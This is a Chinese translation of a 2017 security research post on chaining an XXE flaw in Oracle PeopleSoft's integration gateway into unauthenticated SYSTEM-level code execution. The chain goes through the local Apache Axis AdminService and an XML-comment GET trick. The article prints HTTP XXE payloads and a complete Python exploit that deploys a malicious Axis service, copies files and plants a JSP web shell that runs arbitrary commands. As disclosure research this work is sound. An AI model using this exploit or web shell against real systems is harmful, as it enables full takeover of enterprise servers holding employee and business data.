# 【漏洞分析】Oracle旗下PeopleSoft产品被曝存在未授权远程代码执行漏洞

阅读量 **150174**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-05-18 13:29:45

 **x**

##### 译文声明

本文是翻译文章，文章来源：ambionics.io

原文地址：<https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce>

译文仅供参考，具体内容表达以及含义原文为准。

****

****

翻译：[ **WisFree**](http://bobao.360.cn/member/contribute?uid=2606963099)

**稿费：150RMB**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**Oracle PeopleSoft**

在几个月以前，我有幸得到了审查Oracle PeopleSoft解决方案的机会，审查对象包括PeopleSoft
HRMS和PeopleTool在内。除了几个没有记录在案的CVE之外，网络上似乎没有给我提供了多少针对这类软件的攻击方法，不过[
**ERPScan**](https://erpscan.com/) 的技术专家在两年前发布的[
**这份演讲文稿**](https://erpscan.com/wp-content/uploads/presentations/2015-HITB-Amsterdam-Oracle-PeopleSoft-Applications-are-Under-Attack.pdf)
倒是给我提供了不少有价值的信息。从演示文稿中我们可以清楚地了解到，PeopleSoft简直就是一个装满了漏洞的容器，只不过目前还没有多少有关这些漏洞的公开信息而已。

PeopleSoft应用包含各种各样不同的终端节点，其中很大一部分节点是没有经过身份验证的。除此之外，很多服务正好使用的仍是默认密码，这很有可能是为了更好地实现互联互通性才这样设计的。但事实证明，这种设计不仅是非常不安全的，而且也十分不明智，而这将会让PeopleSoft完全暴露在安全威胁之中。

在这篇文章中，我将会给大家介绍一种能够将XXE漏洞转换成以SYSTEM权限运行命令的通用方法，几乎所有的PeopleSoft版本都会受到影响。

  

**XXE：访问本地网络**

目前该产品中已知的XXE漏洞已经有很多了，例如[ **CVE-2013-3800**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3800) 和[
**CVE-2013-3821**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3821) 。ERPScan在演示文稿中记录的最后一个漏洞样本为[
**CVE-2017-3548**](https://erpscan.com/advisories/erpscan-17-020-xxe-via-doctype-peoplesoft/)
，简单来说，这些漏洞将允许我们提取出PeopleSoft和WebLogic控制台的登录凭证，但拿到这两个控制台的Shell绝非易事。除此之外，由于最后一个XXE漏洞为Blind-XXE，因此我们假设目标网络安装有防火墙软件，并且增加了从本地文件提取数据的难度。

**CVE-2013-3821：集成网关HttpListeningConnector XXE**

    
    
    POST /PSIGW/HttpListeningConnector HTTP/1.1
    Host: website.com
    Content-Type: application/xml
    ...
    <?xml version="1.0"?>
    <!DOCTYPE IBRequest [
    <!ENTITY x SYSTEM "http://localhost:51420">
    ]>
    <IBRequest>
       <ExternalOperationName>&x;</ExternalOperationName>
       <OperationType/>
       <From><RequestingNode/>
          <Password/>
          <OrigUser/>
          <OrigNode/>
          <OrigProcess/>
          <OrigTimeStamp/>
       </From>
       <To>
          <FinalDestination/>
          <DestinationNode/>
          <SubChannel/>
       </To>
       <ContentSections>
          <ContentSection>
             <NonRepudiation/>
             <MessageVersion/>
             <Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
             </Data>
          </ContentSection>
       </ContentSections>
    </IBRequest>

**CVE-2017-3548：集成网关PeopleSoftServiceListeningConnector XXE**

    
    
    POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
    Host: website.com
    Content-Type: application/xml
    ...
    <!DOCTYPE a PUBLIC "-//B/A/EN" "C:windows">

在这里，我们准备利用这些XXE漏洞来访问localhost的各种服务，并尝试绕过防火墙规则或身份认证机制，但现在的问题是如何找到服务所绑定的本地端口。为了解决这个问题，我们可以访问服务的主页，然后查看cookie内容：

    
    
    Set-Cookie: SNP2118-51500-PORTAL-PSJSESSIONID=9JwqZVxKjzGJn1s5DLf1t46pz91FFb3p!-1515514079;

我们可以看到，当前服务所使用的端口为51500。此时，我们就可以通过http://localhost:51500/来访问应用程序了。

  

**Apache Axis**

其中一个未进行身份验证的服务就是Apache Axis
1.4服务器，所在的URL地址为http://website.com/pspc/services。Apache
Axis允许我们在Java类中通过生成WSDL和帮助代码来构建SOAP终端节点并与之进行交互。为了管理服务器，我们必须与AdminService进行交互。URL地址如下：http://website.com/pspc/services/AdminService。

为了让大家能够更好地理解，我们在下面给出了一个演示样例。在下面这个例子中，一名管理员基于java.util.Random类创建了一个终端节点：

    
    
    POST /pspc/services/AdminService
    Host: website.com
    SOAPAction: something
    Content-Type: application/xml
    ...
    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
            <ns1:deployment
                xmlns="http://xml.apache.org/axis/wsdd/"
                xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
                xmlns:ns1="http://xml.apache.org/axis/wsdd/">
                <ns1:service name="RandomService" provider="java:RPC">
                    <ns1:parameter name="className" value="java.util.Random"/>
                    <ns1:parameter name="allowedMethods" value="*"/>
                </ns1:service>
            </ns1:deployment>
        </soapenv:Body>
    </soapenv:Envelope>

这样一来，java.util.Random类中的每一个公共方法都可以作为一个Web服务来使用了。在下面的例子中，我们通过SOAP来调用Random.nextInt()：

    
    
    POST /pspc/services/RandomService
    Host: website.com
    SOAPAction: something
    Content-Type: application/xml
    ...
    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
            <api:nextInt />
        </soapenv:Body>
    </soapenv:Envelope>

响应信息如下：

    
    
    HTTP/1.1 200 OK
    ...
    <?xml version="1.0" encoding="UTF-8"?>
    <soapenv:Envelope
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <soapenv:Body>
            <ns1:nextIntResponse
                soapen
                xmlns:ns1="http://127.0.0.1/Integrics/Enswitch/API">
                <nextIntReturn href="#id0"/>
            </ns1:nextIntResponse>
            <multiRef id="id0" soapenc:root="0"
                soapen
                xsi:type="xsd:int"
                xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
                1244788438 <!-- Here's our random integer -->
            </multiRef>
        </soapenv:Body>
    </soapenv:Envelope>

虽然这个管理员终端节点已经屏蔽了外部IP地址，但是当我们通过localhost来访问它时却不需要输入任何的密码。因此，这里也就成为了我们的一个攻击测试点了。由于我们使用的是一个XXE漏洞，因此POST请求在这里就不可行了，而我们需要一种方法来将我们的SOAP
Payload转换为GET请求发送给主机服务器。

  

**Axis：从POST到GET**

Axis API允许我们发送GET请求。它首先会接收我们给定的URL参数，然后再将其转换为一个SOAP
Payload。下面这段Axis源代码样例会将GET参数转换为一个XML Payload：

    
    
    public class AxisServer extends AxisEngine {
        [...]
        {
            String method = null;
            String args = "";
            Enumeration e = request.getParameterNames();
            while (e.hasMoreElements()) {
                String param = (String) e.nextElement();
                if (param.equalsIgnoreCase ("method")) {
                    method = request.getParameter (param);
                }
                else {
                    args += "<" + param + ">" + request.getParameter (param) +
                            "</" + param + ">";
                }
            }
            String body = "<" + method + ">" + args + "</" + method + ">";
            String msgtxt = "<SOAP-ENV:Envelope" +
                    " xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">" +
                    "<SOAP-ENV:Body>" + body + "</SOAP-ENV:Body>" +
                    "</SOAP-ENV:Envelope>";
        }
    }

为了深入理解它的运行机制，我们再给大家提供一个样例：

    
    
    GET /pspc/services/SomeService
         ?method=myMethod
         &parameter1=test1
    &parameter2=test2

上面这个GET请求等同于：

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
            <myMethod>
                <parameter1>test1</parameter1>
                <parameter2>test2</parameter2>
            </myMethod>
        </soapenv:Body>
    </soapenv:Envelope>

然而，当我们尝试使用这种方法来设置一个新的终端节点时，系统却出现了错误。我们的XML标签必须有属性，但我们的代码却做不到这一点。当我们尝试在GET请求中添加标签属性时，情况如下：

    
    
    GET /pspc/services/SomeService
         ?method=myMethod+attr0="x"
         &parameter1+attr1="y"=test1
    &parameter2=test2

但我们得到的结果如下：

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
            <myMethod attr0="x">
                <parameter1 attr1="y">test1</parameter1 attr1="y">
                <parameter2>test2</parameter2>
            </myMethod attr0="x">
        </soapenv:Body>
    </soapenv:Envelope>

很明显，这并不是有效的XML代码，所以我们的请求才会被服务器拒绝。如果我们将整个Payload放到方法的参数中，比如说这样：

    
    
    GET /pspc/services/SomeService
    ?method=myMethod+attr="x"><test>y</test></myMethod

此时我们得到的结果如下：

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
            <myMethod attr="x"><test>y</test></myMethod>
            </myMethod attr="x"><test>y</test></myMethod>
        </soapenv:Body>
    </soapenv:Envelope>

此时，我们的Payload将会出现两次，第一次的前缀为“<”，第二次为“</”。最终的解决方案需要用到XML注释：

    
    
    GET /pspc/services/SomeService
    ?method=!--><myMethod+attr="x"><test>y</test></myMethod

此时我们得到的结果如下：

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
            <!--><myMethod attr="x"><test>y</test></myMethod>
            </!--><myMethod attr="x"><test>y</test></myMethod>
        </soapenv:Body>
    </soapenv:Envelope>

由于我们添加了前缀“!–>”，所以第一个Payload是以“<!–”开头的，这也是XML注释的起始标记。第二行以“</!”开头，后面跟着的是“–>”，它表示注释结束。因此，这也就意味着我们的第一行Payload将会被忽略，而我们的Payload现在只会被解析一次。

这样一来，我们就可以将任意的SOAP请求从POST转变为GET了，这也就意味着我们可以将任何的类当作Axis服务进行部署，并利用XXE漏洞绕过服务的IP检测。

  

**Axis：小工具（Gadgets）**

Apache
Axis在部署服务的过程中不允许我们上传自己的Java类，因此我们只能使用服务提供给我们的类。在对PeopleSoft的pspc.war（包含Axis实例）进行了分析之后，我们发现org.apache.pluto.portalImpl包中的Deploy类包含很多非常有趣的方法。首先，addToEntityReg(String[]
args)方法允许我们在一个XML文件的结尾处添加任意数据。其次，copy(file1,
file2)方法还允许我们随意拷贝任意文件。这样一来，我们就可以向我们的XML注入一个JSP
Payload，然后将它拷贝到webroot中，这样就足以够我们拿到Shell了。

正如我们所期待的那样，PeopleSoft以SYSTEM权限运行了，而这将允许攻击者通过一个XXE漏洞触发PeopleSoft中的远程代码执行漏洞，并通过SYSTEM权限运行任意代码。

**  
**

**漏洞利用 PoC**

这种漏洞利用方法几乎适用于目前任意版本的PeopleSoft，在使用之前，请确保修改了相应的XXE终端节点：

    
    
    #!/usr/bin/python3
    # Oracle PeopleSoft SYSTEM RCE
    # https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
    # cf
    # 2017-05-17
    import requests
    import urllib.parse
    import re
    import string
    import random
    import sys
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        import colorama
    except ImportError:
        colorama = None
    else:
        colorama.init()
        COLORS = {
            '+': colorama.Fore.GREEN,
            '-': colorama.Fore.RED,
            ':': colorama.Fore.BLUE,
            '!': colorama.Fore.YELLOW
        }
    URL = sys.argv[1].rstrip('/')
    CLASS_NAME = 'org.apache.pluto.portalImpl.Deploy'
    PROXY = 'localhost:8080'
    # shell.jsp?c=whoami
    PAYLOAD = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>'
    class Browser:
        """Wrapper around requests.
        """
        def __init__(self, url):
            self.url = url
            self.init()
        def init(self):
            self.session = requests.Session()
            self.session.proxies = {
                'http': PROXY,
                'https': PROXY
            }
            self.session.verify = False
        def get(self, url ,*args, **kwargs):
            return self.session.get(url=self.url + url, *args, **kwargs)
        def post(self, url, *args, **kwargs):
            return self.session.post(url=self.url + url, *args, **kwargs)
        def matches(self, r, regex):
            return re.findall(regex, r.text)
    class Recon(Browser):
        """Grabs different informations about the target.
        """
        def check_all(self):
            self.site_id = None
            self.local_port = None
            self.check_version()
            self.check_site_id()
            self.check_local_infos()
        def check_version(self):
            """Grabs PeopleTools' version.
            """
            self.version = None
            r = self.get('/PSEMHUB/hub')
            m = self.matches(r, 'Registered Hosts Summary - ([0-9.]+).</b>')
            if m:
                self.version = m[0]
                o(':', 'PTools version: %s' % self.version)
            else:
                o('-', 'Unable to find version')
        def check_site_id(self):
            """Grabs the site ID and the local port.
            """
            if self.site_id:
                return
            r = self.get('/')
            m = self.matches(r, '/([^/]+)/signon.html')
            if not m:
                raise RuntimeError('Unable to find site ID')
            self.site_id = m[0]
            o('+', 'Site ID: ' + self.site_id)
        def check_local_infos(self):
            """Uses cookies to leak hostname and local port.
            """
            if self.local_port:
                return
            r = self.get('/psp/%s/signon.html' % self.site_id)
            for c, v in self.session.cookies.items():
                if c.endswith('-PORTAL-PSJSESSIONID'):
                    self.local_host, self.local_port, *_ = c.split('-')
                    o('+', 'Target: %s:%s' % (self.local_host, self.local_port))
                    return
            raise RuntimeError('Unable to get local hostname / port')
    class AxisDeploy(Recon):
        """Uses the XXE to install Deploy, and uses its two useful methods to get
        a shell.
        """
        def init(self):
            super().init()
            self.service_name = 'YZWXOUuHhildsVmHwIKdZbDCNmRHznXR' #self.random_string(10)
        def random_string(self, size):
            return ''.join(random.choice(string.ascii_letters) for _ in range(size))
        def url_service(self, payload):
            return 'http://localhost:%s/pspc/services/AdminService?method=%s' % (
                self.local_port,
                urllib.parse.quote_plus(self.psoap(payload))
            )
        def war_path(self, name):
            # This is just a guess from the few PeopleSoft instances we audited.
            # It might be wrong.
            suffix = '.war' if self.version and self.version >= '8.50' else ''
            return './applications/peoplesoft/%s%s' % (name, suffix)
        def pxml(self, payload):
            """Converts an XML payload into a one-liner.
            """
            payload = payload.strip().replace('n', ' ')
            payload = re.sub('s+<', '<', payload, flags=re.S)
            payload = re.sub('s+', ' ', payload, flags=re.S)
            return payload
        def psoap(self, payload):
            """Converts a SOAP payload into a one-liner, including the comment trick
            to allow attributes.
            """
            payload = self.pxml(payload)
            payload = '!-->%s' % payload[:-1]
            return payload
        def soap_service_deploy(self):
            """SOAP payload to deploy the service.
            """
            return """
            <ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
            xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
            xmlns:ns1="http://xml.apache.org/axis/wsdd/">
                <ns1:service name="%s" provider="java:RPC">
                    <ns1:parameter name="className" value="%s"/>
                    <ns1:parameter name="allowedMethods" value="*"/>
                </ns1:service>
            </ns1:deployment>
            """ % (self.service_name, CLASS_NAME)
        def soap_service_undeploy(self):
            """SOAP payload to undeploy the service.
            """
            return """
            <ns1:undeployment xmlns="http://xml.apache.org/axis/wsdd/"
            xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="%s"/>
            </ns1:undeployment>
            """ % (self.service_name, )
        def xxe_ssrf(self, payload):
            """Runs the given AXIS deploy/undeploy payload through the XXE.
            """
            data = """
            <?xml version="1.0"?>
            <!DOCTYPE IBRequest [
            <!ENTITY x SYSTEM "%s">
            ]>
            <IBRequest>
               <ExternalOperationName>&x;</ExternalOperationName>
               <OperationType/>
               <From><RequestingNode/>
                  <Password/>
                  <OrigUser/>
                  <OrigNode/>
                  <OrigProcess/>
                  <OrigTimeStamp/>
               </From>
               <To>
                  <FinalDestination/>
                  <DestinationNode/>
                  <SubChannel/>
               </To>
               <ContentSections>
                  <ContentSection>
                     <NonRepudiation/>
                     <MessageVersion/>
                     <Data>
                     </Data>
                  </ContentSection>
               </ContentSections>
            </IBRequest>
            """ % self.url_service(payload)
            r = self.post(
                '/PSIGW/HttpListeningConnector',
                data=self.pxml(data),
                headers={
                    'Content-Type': 'application/xml'
                }
            )
        def service_check(self):
            """Verifies that the service is correctly installed.
            """
            r = self.get('/pspc/services')
            return self.service_name in r.text
        def service_deploy(self):
            self.xxe_ssrf(self.soap_service_deploy())
            if not self.service_check():
                raise RuntimeError('Unable to deploy service')
            o('+', 'Service deployed')
        def service_undeploy(self):
            if not self.local_port:
                return
            self.xxe_ssrf(self.soap_service_undeploy())
            if self.service_check():
                o('-', 'Unable to undeploy service')
                return
            o('+', 'Service undeployed')
        def service_send(self, data):
            """Send data to the Axis endpoint.
            """
            return self.post(
                '/pspc/services/%s' % self.service_name,
                data=data,
                headers={
                    'SOAPAction': 'useless',
                    'Content-Type': 'application/xml'
                }
            )
        def service_copy(self, path0, path1):
            """Copies one file to another.
            """
            data = """
            <?xml version="1.0" encoding="utf-8"?>
            <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Body>
            <api:copy
            soapen>
                <in0 xsi:type="xsd:string">%s</in0>
                <in1 xsi:type="xsd:string">%s</in1>
            </api:copy>
            </soapenv:Body>
            </soapenv:Envelope>
            """.strip() % (path0, path1)
            response = self.service_send(data)
            return '<ns1:copyResponse' in response.text
        def service_main(self, tmp_path, tmp_dir):
            """Writes the payload at the end of the .xml file.
            """
            data = """
            <?xml version="1.0" encoding="utf-8"?>
            <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Body>
            <api:main
            soapen>
                <api:in0>
                    <item xsi:type="xsd:string">%s</item>
                    <item xsi:type="xsd:string">%s</item>
                    <item xsi:type="xsd:string">%s.war</item>
                    <item xsi:type="xsd:string">something</item>
                    <item xsi:type="xsd:string">-addToEntityReg</item>
                    <item xsi:type="xsd:string"><![CDATA[%s]]></item>
                </api:in0>
            </api:main>
            </soapenv:Body>
            </soapenv:Envelope>
            """.strip() % (tmp_path, tmp_dir, tmp_dir, PAYLOAD)
            response = self.service_send(data)
        def build_shell(self):
            """Builds a SYSTEM shell.
            """
            # On versions >= 8.50, using another extension than JSP got 70 bytes
            # in return every time, for some reason.
            # Using .jsp seems to trigger caching, thus the same pivot cannot be
            # used to extract several files.
            # Again, this is just from experience, nothing confirmed
            pivot = '/%s.jsp' % self.random_string(20)
            pivot_path = self.war_path('PSOL') + pivot
            pivot_url = '/PSOL' + pivot
            # 1: Copy portletentityregistry.xml to TMP
            per = '/WEB-INF/data/portletentityregistry.xml'
            per_path = self.war_path('pspc')
            tmp_path = '../' * 20 + 'TEMP'
            tmp_dir = self.random_string(20)
            tmp_per = tmp_path + '/' + tmp_dir + per
            if not self.service_copy(per_path + per, tmp_per):
                raise RuntimeError('Unable to copy original XML file')
            # 2: Add JSP payload
            self.service_main(tmp_path, tmp_dir)
            # 3: Copy XML to JSP in webroot
            if not self.service_copy(tmp_per, pivot_path):
                raise RuntimeError('Unable to copy modified XML file')
            response = self.get(pivot_url)
            if response.status_code != 200:
                raise RuntimeError('Unable to access JSP shell')
            o('+', 'Shell URL: ' + self.url + pivot_url)
    class PeopleSoftRCE(AxisDeploy):
        def __init__(self, url):
            super().__init__(url)
    def o(s, message):
        if colorama:
            c = COLORS[s]
            s = colorama.Style.BRIGHT + COLORS[s] + '|' + colorama.Style.RESET_ALL
        print('%s %s' % (s, message))
    x = PeopleSoftRCE(URL)
    try:
        x.check_all()
        x.service_deploy()
        x.build_shell()
    except RuntimeError as e:
        o('-', e)
    finally:
        x.service_undeploy()

本文翻译自ambionics.io [原文链接](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **WisFree** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86120](/post/id/86120)

安全客 - 有思想的安全新媒体

本文转载自: [ambionics.io](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)

如若转载,请注明出处： <https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t014c3fa13dce6c85dd.png) WisFree

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

